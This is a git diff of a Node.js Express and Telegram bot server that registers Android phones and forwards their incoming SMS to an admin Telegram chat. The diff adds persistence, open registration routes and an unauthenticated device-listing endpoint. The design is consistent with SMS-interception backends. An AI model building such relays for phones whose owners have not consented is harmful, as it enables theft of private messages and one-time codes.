@@ -1,4 +1,6 @@
 const express = require('express');
+const fs = require('fs');
+const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
 
 // Configuration & Environment Variables
@@ -8,11 +10,44 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8753024194';
 const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID || process.env.GROUPCHATID || '-1004375481014';
 const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL || `http://localhost:${PORT}`;
 
+const DEVICES_FILE = path.join(__dirname, 'devices.json');
+
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // In-Memory Device Storage: deviceId -> object
 const devices = new Map();
+
+// File Persistence
+function loadDevices() {
+  try {
+    if (fs.existsSync(DEVICES_FILE)) {
+      const data = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
+      Object.keys(data).forEach(id => {
+        devices.set(id, data[id]);
+      });
+      console.log(`[Storage] Loaded ${devices.size} device(s) from devices.json`);
+    }
+  } catch (e) {
+    console.error('[Storage Error] Failed to load devices.json:', e.message);
+  }
+}
+
+function saveDevices() {
+  try {
+    const obj = {};
+    devices.forEach((val, key) => {
+      obj[key] = val;
+    });
+    fs.writeFileSync(DEVICES_FILE, JSON.stringify(obj, null, 2), 'utf8');
+  } catch (e) {
+    console.error('[Storage Error] Failed to save devices.json:', e.message);
+  }
+}
+
+// Load persisted devices on startup
+loadDevices();
 
 // Initialize Telegram Bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -34,6 +69,29 @@ function isAdmin(chatId) {
   return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
 }
 
+function handleDeviceRegistrationData(data) {
+  const deviceId = data.deviceId || data.device_id || data.id;
+  if (!deviceId) return null;
+
+  const existing = devices.get(deviceId) || {};
+  const updatedDev = {
+    deviceId,
+    deviceAlias: data.deviceAlias || data.alias || existing.deviceAlias || data.model || 'Android Device',
+    model: data.model || existing.model || 'Unknown Model',
+    batteryLevel: data.batteryLevel !== undefined ? Number(data.batteryLevel) : (existing.batteryLevel ?? -1),
+    isCharging: data.isCharging !== undefined ? Boolean(data.isCharging) : (existing.isCharging ?? false),
+    isServiceRunning: data.isServiceRunning !== undefined ? Boolean(data.isServiceRunning) : true,
+    isForwardingEnabled: data.isForwardingEnabled !== undefined ? Boolean(data.isForwardingEnabled) : true,
+    killReason: data.killReason || existing.killReason || 'Running smoothly',
+    lastSeen: new Date().toISOString()
+  };
+
+  devices.set(deviceId, updatedDev);
+  saveDevices();
+  console.log(`[Device Registered/Updated] ID: ${deviceId} (${updatedDev.deviceAlias})`);
+  return updatedDev;
+}
+
 function buildMainReplyKeyboard() {
   return {
     keyboard: [
@@ -45,8 +103,19 @@ function buildMainReplyKeyboard() {
 }
 
 function buildDeviceControlMessage(dev) {
-  const isOnline = (new Date() - new Date(dev.lastSeen)) < 3 * 60 * 1000;
-  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
+  const lastSeenMs = dev.lastSeen ? (new Date() - new Date(dev.lastSeen)) : 0;
+  const minsAgo = Math.floor(lastSeenMs / 60000);
+  const timeText = minsAgo === 0 ? 'just now' : `${minsAgo}m ago`;
+
+  let liveStatus = '🟢 *Online & Active*';
+  if (lastSeenMs >= 20 * 60 * 1000) {
+    liveStatus = `🔴 *Offline / Inactive* _(${timeText})_`;
+  } else if (lastSeenMs >= 7 * 60 * 1000) {
+    liveStatus = `🟡 *Standby / Background* _(${timeText})_`;
+  } else {
+    liveStatus = `🟢 *Online & Active* _(${timeText})_`;
+  }
+
   const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
   const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';
 
@@ -109,10 +178,14 @@ function buildSmsSettingsKeyboard(devId) {
 }
 
 // ----------------------------------------------------
-// 1. EXPRESS HTTP ENDPOINTS
+// 1. EXPRESS HTTP ENDPOINTS (Multi-route support)
 // ----------------------------------------------------
 
 app.get('/', (req, res) => {
+  if (req.query.deviceId || req.query.id) {
+    const dev = handleDeviceRegistrationData(req.query);
+    return res.json({ success: true, device: dev });
+  }
   res.json({
     status: 'online',
     app: 'SMS Forwarder Telegram Bot',
@@ -125,32 +198,41 @@ app.get('/ping', (req, res) => {
   res.json({ status: 'alive', time: new Date().toISOString() });
 });
 
-app.post('/api/register-device', (req, res) => {
-  const { deviceId, deviceAlias, model, batteryLevel, isCharging, isServiceRunning, isForwardingEnabled, killReason } = req.body;
+// Registration Endpoints (Supports ALL variations: POST / GET / Query / Body)
+const registerRoutes = ['/api/register-device', '/register-device', '/register', '/api/register'];
 
-  if (!deviceId) {
-    return res.status(400).json({ error: 'deviceId is required' });
-  }
-
-  const existing = devices.get(deviceId) || {};
-  devices.set(deviceId, {
-    deviceId,
-    deviceAlias: deviceAlias || existing.deviceAlias || model || 'Android Device',
-    model: model || 'Unknown Model',
-    batteryLevel: batteryLevel ?? -1,
-    isCharging: !!isCharging,
-    isServiceRunning: isServiceRunning !== false,
-    isForwardingEnabled: isForwardingEnabled !== false,
-    killReason: killReason || 'Running smoothly',
-    lastSeen: new Date()
+registerRoutes.forEach(route => {
+  app.post(route, (req, res) => {
+    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
+    if (!dev) return res.status(400).json({ error: 'deviceId is required' });
+    res.json({ success: true, device: dev });
   });
 
-  console.log(`[Device Registered/Updated] ID: ${deviceId} (${deviceAlias})`);
-  res.json({ success: true });
+  app.get(route, (req, res) => {
+    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
+    if (!dev) return res.status(400).json({ error: 'deviceId query param is required' });
+    res.json({ success: true, device: dev });
+  });
+});
+
+app.get('/api/devices', (req, res) => {
+  res.json({
+    count: devices.size,
+    devices: Array.from(devices.values())
+  });
 });
 
 app.post('/api/forward-sms', async (req, res) => {
   const { deviceId, sender, body, simSlot, timestamp } = req.body;
+
+  if (deviceId && !devices.has(deviceId)) {
+    handleDeviceRegistrationData({
+      deviceId,
+      deviceAlias: 'Android Device',
+      model: 'Android Phone',
+      killReason: 'Auto-registered on SMS receive'
+    });
+  }
 
   const dev = devices.get(deviceId) || { deviceAlias: 'Android Device' };
   const timeStr = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
@@ -179,10 +261,11 @@ const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
   if (GROUP_CHAT_ID) console.log(`👥 Group Chat ID: ${GROUP_CHAT_ID}`);
   console.log(`🔗 External URL: ${RENDER_EXTERNAL_URL}`);
+  console.log(`💾 Persisted Devices: ${devices.size}`);
   console.log(`====================================================`);
 });
 
-// Self-Ping Keep Alive
+// Self-Ping Keep Alive (every 3 minutes to strictly prevent Render spin-down)
 setInterval(async () => {
   try {
     const pingUrl = RENDER_EXTERNAL_URL.endsWith('/') ? `${RENDER_EXTERNAL_URL}ping` : `${RENDER_EXTERNAL_URL}/ping`;
@@ -191,7 +274,7 @@ setInterval(async () => {
   } catch (err) {
     console.error(`[Self-Ping Keep-Alive] Ping failed:`, err.message);
   }
-}, 5 * 60 * 1000);
+}, 3 * 60 * 1000);
 
 function extractAndAutoRegisterDevice(text) {
   if (!text) return;
@@ -200,33 +283,18 @@ function extractAndAutoRegisterDevice(text) {
   if (!idMatch) return;
 
   const devId = idMatch[1].trim();
-
   const aliasMatch = text.match(/📱\s*\*?Device:\*?\s*`?([^`\n]+)`?/i);
   const devAlias = aliasMatch ? aliasMatch[1].trim() : 'Android Device';
 
   const modelMatch = text.match(/📲\s*\*?Model:\*?\s*`?([^`\n]+)`?/i);
   const devModel = modelMatch ? modelMatch[1].trim() : devAlias;
 
-  if (!devices.has(devId)) {
-    devices.set(devId, {
-      deviceId: devId,
-      deviceAlias: devAlias,
-      model: devModel,
-      batteryLevel: 100,
-      isCharging: false,
-      isServiceRunning: true,
-      isForwardingEnabled: true,
-      killReason: 'Auto-registered via Telegram notification',
-      lastSeen: new Date()
-    });
-    console.log(`[Auto-Registered via Telegram Message] ID: ${devId} | Alias: ${devAlias}`);
-  } else {
-    const dev = devices.get(devId);
-    dev.lastSeen = new Date();
-    dev.deviceAlias = devAlias;
-    dev.model = devModel;
-    devices.set(devId, dev);
-  }
+  handleDeviceRegistrationData({
+    deviceId: devId,
+    deviceAlias: devAlias,
+    model: devModel,
+    killReason: 'Auto-registered via Telegram notification'
+  });
 }
 
 // Telegram Message Handler
@@ -288,7 +356,7 @@ bot.on('message', async (msg) => {
     let onlineCount = 0;
     const now = new Date();
     devices.forEach(d => {
-      if ((now - new Date(d.lastSeen)) < 3 * 60 * 1000) onlineCount++;
+      if ((now - new Date(d.lastSeen)) < 5 * 60 * 1000) onlineCount++;
     });
 
     const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
@@ -319,6 +387,7 @@ bot.on('message', async (msg) => {
     const oldName = dev.deviceAlias;
     dev.deviceAlias = newName;
     devices.set(dev.deviceId, dev);
+    saveDevices();
 
     await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
     return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
@@ -390,6 +459,7 @@ bot.on('callback_query', async (query) => {
     case 'sms_on':
       dev.isForwardingEnabled = true;
       devices.set(devId, dev);
+      saveDevices();
       await bot.editMessageText(buildSmsSettingsMessage(dev), {
         chat_id: chatId,
         message_id: messageId,
@@ -403,6 +473,7 @@ bot.on('callback_query', async (query) => {
     case 'sms_off':
       dev.isForwardingEnabled = false;
       devices.set(devId, dev);
+      saveDevices();
       await bot.editMessageText(buildSmsSettingsMessage(dev), {
         chat_id: chatId,
         message_id: messageId,
